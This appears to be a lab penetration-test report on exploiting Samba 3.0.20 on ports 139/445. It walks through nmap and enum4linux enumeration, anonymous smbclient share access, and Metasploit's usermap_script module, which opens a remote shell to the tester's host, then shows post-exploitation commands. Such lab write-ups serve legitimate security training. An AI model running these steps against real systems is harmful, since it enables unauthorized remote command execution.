# 🔐 Penetration Test Report – Samba Exploitation (Ports 139/445)

## 📌 Target Information

- \*\*Target IP:\*\* `192.168.1.184`
- \*\*Service:\*\* Samba 3.0.20-Debian
- \*\*Discovered Ports:\*\* `139`, `445`

---

## 🔎 1. Service Enumeration with Nmap

* We performed an initial scan to identify open SMB ports and services:

```bash
nmap -p 139,445 -sC -sV 192.168.1.184
```
## ✅ Output:
```
PORT     STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
```
![Nmap](file:///C:/Users/moham/OneDrive/Desktop/Nmap.png)
## 🧰 2. Enumerating SMB Users and Shares – enum4linux
* We used enum4linux for deep enumeration:

enum4linux -a 192.168.1.184
### ✅ Findings:

* 🧑‍💻 **Users:** `root`, `msfadmin`, `postgres`, `nobody`, `user`, `www-data`, ...
* 📁 **Shares:**

    * `print$` – Access: ❌
    * `tmp` – Access: ✅
    * `opt` – Access: ❌
    ![Enum1](file:///C:/Users/moham/OneDrive/Desktop/Enum1.png)
    ![Enum2](file:///C:/Users/moham/OneDrive/Desktop/Enum2.png)
    ## 📂 3. Anonymous Access to Share (smbclient)

* We accessed the `tmp` share with anonymous login:

```
bashCopyEditsmbclient //192.168.1.184/tmp
```

* Uploaded a test file:

```
bashCopyEditput test.txt
```
## 💣 4. Exploiting Samba – `usermap_script` via Metasploit

We used Metasploit’s `usermap_script` exploit to get remote shell:

```
bashCopyEdituse exploit/multi/samba/usermap_script
set RHOSTS 192.168.1.184
set LHOST 192.168.1.182
run
```

### ✅ Result:

```
cssCopyEdit[*] Command shell session 1 opened
```
![Shell](file:///C:/Users/moham/OneDrive/Desktop/Shell.png)
## 🖥️ 5. Post-Exploitation: Host Info
* We validated shell access by running commands:
```
whoami
id
uname -a
cat /etc/issue
```
![Shell2](file:///C:/Users/moham/OneDrive/Desktop/Shell2.png)
## ✅ Conclusion

We successfully:

* Enumerated SMB users and shares
* Gained anonymous access to `/tmp` share
* Exploited Samba 3.0.20 with Metasploit
* Achieved remote shell on the target

> 
> 
> 🔐 **Vulnerability:** Samba 3.0.20 - `usermap_script`
> 
> ☠️ **Impact:** Full command execution
> 
> 💡 **Remediation:** Update Samba to the latest version and restrict anonymous access.
>